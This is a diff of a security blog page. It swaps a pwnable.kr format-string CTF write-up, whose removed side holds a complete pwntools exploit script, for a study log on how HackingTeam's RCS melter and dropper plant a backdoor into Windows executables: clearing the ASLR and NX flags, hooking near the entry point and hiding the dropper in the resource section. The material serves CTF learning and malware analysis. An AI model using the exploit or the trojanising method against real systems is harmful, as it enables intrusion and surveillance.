@@ -6,20 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://l1b0.fun">
-  <title>Pwnable-Kr-Rookiss-fsb | l1b0&#39;s blog</title>
+  <title>HackingTeam RCS code 分析记录 | l1b0&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="题面 Isn’t FSB almost obsolete in computer security?Anyway, have fun with it :) ssh fsb@pwnable.kr -p2222 (pw:guest) On Aug 15,2018">
-<meta name="keywords" content="Format-String-Bug">
+  <meta name="description" content="记录10.17起的学习过程，主要记录对rcs_code的分析。 源码链接  前言rcs的全称是remote control system，意思是远程控制系统，是一套用于政府拦截的黑客套件，实现了全平台的监控系统。 本次分析融合功能涉及四个模块，如下图。  接下来是详细分析。">
+<meta name="keywords" content="HackingTeam,RCS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwnable-Kr-Rookiss-fsb">
-<meta property="og:url" content="https://l1b0.fun/30973/index.html">
+<meta property="og:title" content="HackingTeam RCS code 分析记录">
+<meta property="og:url" content="https://l1b0.fun/f0262a98/index.html">
 <meta property="og:site_name" content="l1b0&#39;s blog">
-<meta property="og:description" content="题面 Isn’t FSB almost obsolete in computer security?Anyway, have fun with it :) ssh fsb@pwnable.kr -p2222 (pw:guest) On Aug 15,2018">
+<meta property="og:description" content="记录10.17起的学习过程，主要记录对rcs_code的分析。 源码链接  前言rcs的全称是remote control system，意思是远程控制系统，是一套用于政府拦截的黑客套件，实现了全平台的监控系统。 本次分析融合功能涉及四个模块，如下图。  接下来是详细分析。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-23T03:13:36.365Z">
+<meta property="og:image" content="https://l1b0.fun/s2.ax1x.com/2019/11/21/M58qHI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/21/M53PzQ.png">
+<meta property="og:updated_time" content="2019-11-21T03:31:53.078Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Pwnable-Kr-Rookiss-fsb">
-<meta name="twitter:description" content="题面 Isn’t FSB almost obsolete in computer security?Anyway, have fun with it :) ssh fsb@pwnable.kr -p2222 (pw:guest) On Aug 15,2018">
+<meta name="twitter:title" content="HackingTeam RCS code 分析记录">
+<meta name="twitter:description" content="记录10.17起的学习过程，主要记录对rcs_code的分析。 源码链接  前言rcs的全称是remote control system，意思是远程控制系统，是一套用于政府拦截的黑客套件，实现了全平台的监控系统。 本次分析融合功能涉及四个模块，如下图。  接下来是详细分析。">
+<meta name="twitter:image" content="https://l1b0.fun/s2.ax1x.com/2019/11/21/M58qHI.png">
   
     <link rel="alternative" href="/atom.xml" title="l1b0&#39;s blog" type="application/atom+xml">
   
@@ -160,52 +163,81 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Pwnable-Kr-Rookiss-fsb" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-HackingTeam-RCS-code-分析记录" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Pwnable-Kr-Rookiss-fsb
+      HackingTeam RCS code 分析记录
     </h1>
   
 
         
                 <!-- 不蒜子统计 -->        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次        </span>
-<a href="/30973/" class="archive-article-date">
-  	<time datetime="2018-08-15T12:25:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-15</time>
+<a href="/f0262a98/" class="archive-article-date">
+  	<time datetime="2019-11-21T03:28:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h4><blockquote>
-<p>Isn’t FSB almost obsolete in computer security?<br>Anyway, have fun with it :)</p>
-<p>ssh <a href="mailto:fsb@pwnable.kr" target="_blank" rel="noopener">fsb@pwnable.kr</a> -p2222 (pw:guest)</p>
-<p>On Aug 15,2018</p>
+        <blockquote>
+<p>记录10.17起的学习过程，主要记录对rcs_code的分析。</p>
+<p><a href="https://github.com/hackedteam" target="_blank" rel="noopener">源码链接</a></p>
 </blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>rcs的全称是remote control system，意思是远程控制系统，是一套用于政府拦截的黑客套件，实现了全平台的监控系统。</p>
+<p>本次分析融合功能涉及四个模块，如下图。</p>
+<p><img src="https:/s2.ax1x.com/2019/11/21/M58qHI.png" alt="list"></p>
+<p>接下来是详细分析。</p>
 <a id="more"></a>
 
-<h4 id="大致分析"><a href="#大致分析" class="headerlink" title="大致分析"></a>大致分析</h4><p>明显的格式化字符串漏洞类型的题目，由于buf不在栈上，我们需要借助栈上的其他数据如ebp来作为跳板。</p>
-<p>类似的题目还有<a href="https://l1b0.github.io/2018/08/08/Format-String-Bug-Training/" target="_blank" rel="noopener">HITCON-Training-lab9</a></p>
-<p>题目流程大致是经过四次<code>read</code>和<code>printf</code>的fsb利用后，check输入的pw和程序随机出来的key是否相等。</p>
-<p>我一开始想的是把key的bss段地址放到栈上，然后通过任意地址读得到key，但后来发现程序生成的key太大了，而pw的输入限制长度为10，所以不可能通过正常流程拿到权限。</p>
-<p>那后来就覆盖sleep的got表的真实地址为<code>execve(&#39;/bin/sh&#39;)</code>，过程正好用了四次fsb。</p>
+<h2 id="融合（代码不全-，跳过）"><a href="#融合（代码不全-，跳过）" class="headerlink" title="融合（代码不全==，跳过）"></a>融合（代码不全==，跳过）</h2><h3 id="melter"><a href="#melter" class="headerlink" title="melter"></a>melter</h3><p>这个模块包含<code>main.cc</code>文件，是融合模块的入口点。<br>用于接收输入参数，并创建PEMelter对象。</p>
+<p>输入参数如下</p>
 <blockquote>
-<ol>
-<li>泄露栈的esp，方便后面定位栈上其他的地址</li>
-<li>泄露main的ebp，由于main的ebp和栈上的偏移不固定，所以需要单独泄露一次</li>
-<li>将main的ebp覆盖为sleep的got表地址</li>
-<li>将sleep的got表地址覆盖为<code>execve(&#39;/bin/sh&#39;)</code></li>
-</ol>
+<p><strong>help</strong>:    参数说明<br><strong>input</strong>:    目标文件的路径，需为<strong>Win32 PE</strong>可执行文件<br><strong>output</strong>: 输出文件的路径，默认为output.exe<br><strong>rcs</strong>:      恶意程序的路径</p>
 </blockquote>
-<h4 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from sys import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos; ]</span><br><span class="line"></span><br><span class="line">if argv[1] == &apos;l&apos;:</span><br><span class="line">    io = process(&apos;./fsb&apos;)</span><br><span class="line">else:</span><br><span class="line">    io = ssh(host=&apos;pwnable.kr&apos;,port=2222,user=&apos;fsb&apos;,password=&apos;guest&apos;).run(&apos;/home/fsb/fsb&apos;)</span><br><span class="line"></span><br><span class="line">def DEBUG():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io,&quot;b *0x08048608\nc&quot;)</span><br><span class="line"></span><br><span class="line">def leak_esp():</span><br><span class="line"></span><br><span class="line">    payload = &quot;+%14$x+&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&apos;+&apos;)</span><br><span class="line">    esp = int(io.recvuntil(&apos;+&apos;)[:-1],16)-0x50</span><br><span class="line"></span><br><span class="line">    return esp</span><br><span class="line"></span><br><span class="line">def leak_ebp_main():</span><br><span class="line"></span><br><span class="line">    payload = &quot;+%18$x+&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&apos;+&apos;)</span><br><span class="line">    ebp_main = int(io.recvuntil(&apos;+&apos;)[:-1],16)</span><br><span class="line"></span><br><span class="line">    return ebp_main</span><br><span class="line"></span><br><span class="line">def ebp_main_to_got():</span><br><span class="line"></span><br><span class="line">    got_addr = 0x0804A008 </span><br><span class="line"></span><br><span class="line">    payload = &quot;%&#123;&#125;c%18$n&quot;.format(got_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">def sleep_to_flag(offset):</span><br><span class="line"></span><br><span class="line">    flag_addr = 0x080486AB</span><br><span class="line">    payload = &quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format(flag_addr&amp;0xffff,offset)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    esp = leak_esp()</span><br><span class="line">    print hex(esp)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    ebp_main = leak_ebp_main()</span><br><span class="line">    print hex(ebp_main)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    ebp_main_to_got()</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    offset = (ebp_main-esp)/4</span><br><span class="line">    sleep_to_flag(offset)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+<p>在接收输入之后判断每个参数（文件）是否存在，并将输入参数输出，之后便创建一个<strong>PEMelter对象</strong>。</p>
+<h3 id="libpemelter"><a href="#libpemelter" class="headerlink" title="libpemelter"></a>libpemelter</h3><p>该模块主要由四个部分组成，分别是<code>PEMelter</code>，<code>PEParser</code>，<code>PEMangler</code>和一个头文件<code>win32type.h</code>。</p>
+<h4 id="win32type-h"><a href="#win32type-h" class="headerlink" title="win32type.h"></a>win32type.h</h4><p>该文件主要定义了一些<strong>关于pe文件解析的结构体</strong>，如IMAGE_SECTION_HEADER，IMAGE_IMPORT_DESCRIPTOR等；<br>以及一些<strong>需要预先声明的定值</strong>，如IMAGE_SIZEOF_FILE_HEADER等。</p>
+<h4 id="PEMelter"><a href="#PEMelter" class="headerlink" title="PEMelter"></a>PEMelter</h4><p>PEMelter类的<strong>构造函数</strong>中创建了三个对象，分别是PEParser、PEMangler以及Melter。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PEMelter::PEMelter()</span><br><span class="line">&#123;</span><br><span class="line">    parser_ = <span class="keyword">new</span> PEParser();</span><br><span class="line">    mangler_ = <span class="keyword">new</span> PEMangler();</span><br><span class="line">    melter_ = <span class="keyword">new</span> Melter(*parser_, *mangler_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h4><ul>
-<li><a href="https://blog.csdn.net/SmalOSnail/article/details/53705774" target="_blank" rel="noopener">https://blog.csdn.net/SmalOSnail/article/details/53705774</a></li>
-</ul>
+<h4 id="PEParser"><a href="#PEParser" class="headerlink" title="PEParser"></a>PEParser</h4><p>PARSER(PEParser); - Parser.h 41</p>
+<h4 id="PEMangler"><a href="#PEMangler" class="headerlink" title="PEMangler"></a>PEMangler</h4><h3 id="libmelter"><a href="#libmelter" class="headerlink" title="libmelter"></a>libmelter</h3><h2 id="下载器-dropper"><a href="#下载器-dropper" class="headerlink" title="下载器 dropper"></a>下载器 dropper</h2><h3 id="RCSWin32Dropper-cpp"><a href="#RCSWin32Dropper-cpp" class="headerlink" title="RCSWin32Dropper.cpp"></a>RCSWin32Dropper.cpp</h3><p>代码首先接收输入，如下。</p>
+<blockquote>
+<p>usage: RCSWin32Dropper.exe -s <scout> <input> <output><br><strong>scout</strong>: 下载器？<br><strong>input</strong>: 原始PE文件<br><strong>output</strong>: 生成的文件</output></scout></p>
+</blockquote>
+<p>这里的<strong>scout</strong>应该是指后门文件，因为在输入之后有这么一句代码<strong>sprintf(MS.core, “%s”, scoutFile);</strong>，而<strong>MS.core</strong>在后面的usage有说明<strong>core is the backdoor core</strong>。</p>
+<p>之后便调用<code>MeltFIle.cpp</code>中的<strong>MeltFile</strong>函数进行处理。</p>
+<h3 id="读取并解析文件内容-MelterFile-cpp-MeltFile-amp-PEObject-cpp-Parse"><a href="#读取并解析文件内容-MelterFile-cpp-MeltFile-amp-PEObject-cpp-Parse" class="headerlink" title="读取并解析文件内容: MelterFile.cpp - MeltFile &amp; PEObject.cpp - Parse"></a>读取并解析文件内容: MelterFile.cpp - MeltFile &amp; PEObject.cpp - Parse</h3><p>MeltFile函数参数说明如下</p>
+<p>int MeltFile( char const * const input_path, char const * const output_path, MelterStruct const * const melter_data, BOOL isScout, char *scout_file )</p>
+<blockquote>
+<p>input_path：输入的input路径<br>output_path：输入的output路径<br>melter_data：一个融合器的结构体<br>isScout：是否为scout?<br>scout_file: 输入的scout路径</p>
+</blockquote>
+<p>这里的调用参数内容为MeltFile( inputFile, outputFile, &amp;MS, TRUE, scoutFile );</p>
+<p>首先读取input_path的内容，并复制一份至data变量，防止修改源文件。</p>
+<p>接着创建一个PEObject对象，构造函数参数内容为input_path的内容data及文件大小size。<br>然后通过PEObject对象的<strong>parse</strong>函数判断文件是否能被解析。</p>
+<p>解析过程如下</p>
+<ol>
+<li>读取文件头（前0x3000）判断文件是否是SFXCAB.exe类型的补丁（_SFX_CAB_EXE_PATH）</li>
+<li>解析DOSHeader、NTHeader。判断是否为<code>Win32 PE for IA-32</code>；是否开启ASLR，NX，FORCE_INTEGRITY，开启则消除标志位；是否绑定导入表，绑定则重置为0；是否开启重定位表，开启则重置为0；读取各个section的内容。</li>
+<li>解析Resources，读取resources段。</li>
+<li>解析Text段，<strong>寻找hook的位置</strong>。通过读取OEP之后的0x400数据，经过反汇编后，寻找长度大于等于5且为jmp或call类的指令，即为要hook的位置（jmp为一定有效的，call为潜在有效的指令）。</li>
+</ol>
+<h3 id="嵌入下载器（dropper）-PEObject-cpp-embedDropper"><a href="#嵌入下载器（dropper）-PEObject-cpp-embedDropper" class="headerlink" title="嵌入下载器（dropper）: PEObject.cpp - embedDropper"></a>嵌入下载器（dropper）: PEObject.cpp - embedDropper</h3><p>首先通过NTHeaders读取OEP（程序入口点），并找到OEP对应的section。</p>
+<p>接着创建一个DropperObject对象名为dropper，将之前在解析文件时找到的hookpoint复制到dropper中。</p>
+<p><strong><u>这里有个dropper.build()忘了看（功能好像就是把木马放进dropper里）。。。</u></strong></p>
+<p>创建dropper成功之后获取Resources section的地址，调用<code>TuneResources</code>函数对<strong>资源段</strong>进行调整，如下图，修改第一层目录的第一个索引，指向新的table（复制原来的table，新增一个表项）。可以看到新增的data entry记录的是dropper的大小及地址，故这里的下载器应该是被加入到资源表的索引中，但此时dropper的数据还没有放进去，只是预留了一块空间。</p>
+<p><img src="https://s2.ax1x.com/2019/11/21/M53PzQ.png" alt="3550652054011fc9b9a8530f6cbe8d52.png"></p>
+<p>之后malloc了一个大小为<code>sizeof(ResourcesSection)+sizeof(dropper)+sizeofResources()</code>的空间，将资源段的数据copy进去，将dropper数据copy进去，调用<code>_writeResources</code>遍历资源段并复制一遍数据，可以说是一个新的资源段（舍去了之前因调整而无索引的table）。并魔改资源段地址为新的资源段地址及大小。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a href="https://blog.csdn.net/zhyulo/article/details/85930045" target="_blank" rel="noopener">PE文件解析-资源(Resource)</a></li>
+<li><a href="https://xakep.ru/2016/12/29/hacking-team-galileo-sources/" target="_blank" rel="noopener">歪果仁的一点分析</a></li>
+<li><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108" target="_blank" rel="noopener">user-mode-rootkits-iat-and-inline-hooking</a></li>
+</ol>
 
       
       
@@ -218,7 +250,7 @@
     
     <br>
     <strong>本文链接：</strong>
-    https://l1b0.fun/30973/
+    https://l1b0.fun/f0262a98/
     <br>
     <strong>版权声明：</strong>
     本作品采用
@@ -238,7 +270,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Format-String-Bug</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HackingTeam</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RCS</a>
         		</li>
       		
 		</ul>
@@ -250,7 +286,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
+        			<a href="/categories/学习记录//" class="article-tag-list-link color5">学习记录</a>
         		</li>
       		
 		</ul>
@@ -305,7 +341,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://l1b0.fun/30973/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://l1b0.fun/f0262a98/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -319,18 +355,9 @@
   
 <nav id="article-nav">
   
-    <a href="/13356/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          安恒杯-7月月赛-Reverse-Youngter-drive
-        
-      </div>
-    </a>
   
-  
-    <a href="/27164/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">TJCTF-2018-bin-Writeup</div>
+    <a href="/f28ff473/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2019上海市大学生网络安全大赛 - puzzle Writeup</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -357,7 +384,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#题面"><span class="toc-number">1.</span> <span class="toc-text">题面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#大致分析"><span class="toc-number">2.</span> <span class="toc-text">大致分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp如下"><span class="toc-number">3.</span> <span class="toc-text">exp如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References:</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#融合（代码不全-，跳过）"><span class="toc-number">2.</span> <span class="toc-text">融合（代码不全==，跳过）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#melter"><span class="toc-number">2.1.</span> <span class="toc-text">melter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libpemelter"><span class="toc-number">2.2.</span> <span class="toc-text">libpemelter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#win32type-h"><span class="toc-number">2.2.1.</span> <span class="toc-text">win32type.h</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PEMelter"><span class="toc-number">2.2.2.</span> <span class="toc-text">PEMelter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PEParser"><span class="toc-number">2.2.3.</span> <span class="toc-text">PEParser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PEMangler"><span class="toc-number">2.2.4.</span> <span class="toc-text">PEMangler</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libmelter"><span class="toc-number">2.3.</span> <span class="toc-text">libmelter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#下载器-dropper"><span class="toc-number">3.</span> <span class="toc-text">下载器 dropper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCSWin32Dropper-cpp"><span class="toc-number">3.1.</span> <span class="toc-text">RCSWin32Dropper.cpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取并解析文件内容-MelterFile-cpp-MeltFile-amp-PEObject-cpp-Parse"><span class="toc-number">3.2.</span> <span class="toc-text">读取并解析文件内容: MelterFile.cpp - MeltFile &amp; PEObject.cpp - Parse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#嵌入下载器（dropper）-PEObject-cpp-embedDropper"><span class="toc-number">3.3.</span> <span class="toc-text">嵌入下载器（dropper）: PEObject.cpp - embedDropper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
                     </div>
                 </span>
             </div>
